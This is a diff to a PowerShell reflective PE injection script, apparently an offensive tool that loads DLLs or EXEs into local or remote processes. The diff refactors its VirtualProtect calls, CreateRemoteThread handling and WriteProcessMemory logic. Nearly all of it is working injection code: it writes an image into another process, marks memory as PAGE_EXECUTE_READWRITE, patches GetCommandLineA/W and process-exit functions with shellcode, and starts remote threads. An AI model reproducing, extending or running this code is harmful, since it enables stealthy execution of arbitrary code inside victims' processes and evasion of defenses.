@@ -588,7 +588,7 @@ $RemoteScriptBlock = {
 		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
 		
 		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
-		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [Ref]) ([Bool])
+		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
 		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
 		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
 		
@@ -1061,37 +1061,7 @@ $RemoteScriptBlock = {
 		else
 		{
 			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
-			if ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]) -eq 8)
-			{
-				$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
-			}
-			else
-			{
-				#todo delete all this and remove win32types from function
-#				$BufferSize = [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.NtCreateThreadExBuffer32)
-#				$NtCreateThreadExBufferPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BufferSize)
-#				$NtCreateThreadExBuffer = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtCreateThreadExBufferPtr, $Win32Types.NtCreateThreadExBuffer32)
-#				
-#				[UInt32]$Temp1 = 0
-#				[UInt32]$Temp2 = 0
-#				[IntPtr]$Temp1Ptr = [IntPtr]::Zero
-#				[IntPtr]$Temp2Ptr = [IntPtr]::Zero
-#				[System.Runtime.InteropServices.Marshal]::StructureToPtr($Temp1, $Temp1Ptr, $false)
-#				[System.Runtime.InteropServices.Marshal]::StructureToPtr($Temp2, $Temp2Ptr, $false)
-#				$NtCreateThreadExBuffer.Size = [UInt32]$BufferSize
-#				$NtCreateThreadExBuffer.Unknown1 = 0x10003
-#				$NtCreateThreadExBuffer.Unknown2 = 0x8
-#				$NtCreateThreadExBuffer.Unknown3 = $Temp1Ptr
-#				$NtCreateThreadExBuffer.Unknown4 = 0
-#				$NtCreateThreadExBuffer.Unknown5 = 0x10004
-#				$NtCreateThreadExBuffer.Unknown6 = 4
-#				$NtCreateThreadExBuffer.Unknown7 = $Temp2Ptr
-#				$NtCreateThreadExBuffer.Unknown8 = 0
-#				
-#				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NtCreateThreadExBuffer, $NtCreateThreadExBufferPtr, $true)
-#				
-				$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
-			}
+			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
 		}
 		
 		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
@@ -1425,7 +1395,7 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions -Win32Types $Win32Types
+			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions -Win32Types $Win32Types
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
@@ -1960,9 +1930,10 @@ $RemoteScriptBlock = {
 			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
 			[UInt32]$SectionSize = $SectionHeader.VirtualSize
 			
-			$OldProtectFlag = 0
+			[UInt32]$OldProtectFlag = 0
 			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
-			$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
+			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
+			#todo delete$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
 			if ($Success -eq $false)
 			{
 				Throw "Unable to change memory protection"
@@ -2000,7 +1971,7 @@ $RemoteScriptBlock = {
 		$ReturnArray = @() 
 		
 		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
-		$OldProtectFlag = 0
+		[UInt32]$OldProtectFlag = 0
 		
 		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
 		if ($Kernel32Handle -eq [IntPtr]::Zero)
@@ -2050,7 +2021,8 @@ $RemoteScriptBlock = {
 
 		#Overwrite GetCommandLineA
 		[UInt32]$OldProtectFlag = 0
-		$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		#todo delete$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
 		if ($Success = $false)
 		{
 			throw "Call to VirtualProtect failed"
@@ -2063,12 +2035,14 @@ $RemoteScriptBlock = {
 		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
 		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
 		
-		Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+		#todo deleteInvoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		
 		
 		#Overwrite GetCommandLineW
 		[UInt32]$OldProtectFlag = 0
-		$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		#todo delete me$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
 		if ($Success = $false)
 		{
 			throw "Call to VirtualProtect failed"
@@ -2081,7 +2055,8 @@ $RemoteScriptBlock = {
 		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
 		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
 		
-		Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+		#todo delete me Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		#################################################
 		
 		
@@ -2118,21 +2093,25 @@ $RemoteScriptBlock = {
 				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
 				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
 				
-				$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+				#todo delete me$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
 				if ($Success = $false)
 				{
 					throw "Call to VirtualProtect failed"
 				}
 				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
-				Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
+				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
+				#todo delete meInvoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
 				
-				$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+				#todo delete $Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
 				if ($Success = $false)
 				{
 					throw "Call to VirtualProtect failed"
 				}
 				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
-				Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
+				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
+				#todo deleteInvoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
 			}
 		}
 		#################################################
@@ -2188,7 +2167,8 @@ $RemoteScriptBlock = {
 				Throw "ExitThread address not found"
 			}
 
-			$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
+			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
+			#todo delete$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
 			if ($Success -eq $false)
 			{
 				Throw "Call to VirtualProtect failed"
@@ -2211,7 +2191,8 @@ $RemoteScriptBlock = {
 			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
 			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp
 
-			Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+			#todo deleteInvoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		}
 		#################################################
 
@@ -2240,7 +2221,8 @@ $RemoteScriptBlock = {
 		[UInt32]$OldProtectFlag = 0
 		foreach ($Info in $CopyInfo)
 		{
-			$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
+			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
+			#todo delete$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
 			if ($Success -eq $false)
 			{
 				Throw "Call to VirtualProtect failed"
@@ -2248,7 +2230,8 @@ $RemoteScriptBlock = {
 			
 			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
 			
-			Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+			#todo deleteInvoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		}
 	}
 
@@ -2356,6 +2339,7 @@ $RemoteScriptBlock = {
 			}
 			
 			[Bool]$Wow64Process = $false
+			#todo make this win32function
 			$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "IsWow64Process" @([IntPtr], [Ref]) @($RemoteProcHandle, [Ref]$Wow64Process)
 			if ($Success -eq $false)
 			{
@@ -2486,11 +2470,14 @@ $RemoteScriptBlock = {
 		
 		
 		#If remote loading, copy the DLL in to remote process memory
-		[UInt32]$NumBytesWritten = 0
-		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]$PEInfo.SizeOfImage, [Ref]$NumBytesWritten)
-		if ($Success -eq $false)
+		if ($RemoteLoading -eq $true)
 		{
-			Throw "Unable to write shellcode to remote process memory."
+			[UInt32]$NumBytesWritten = 0
+			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
+			if ($Success -eq $false)
+			{
+				Throw "Unable to write shellcode to remote process memory."
+			}
 		}
 		
 		
@@ -2575,6 +2562,7 @@ $RemoteScriptBlock = {
 			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."
 
+			#todo make this win32function
 			Invoke-Win32 "kernel32.dll" ([IntPtr]) "CreateThread" @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [Ref]) @([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([IntPtr]::Zero)) | Out-Null
 
 			while($true)
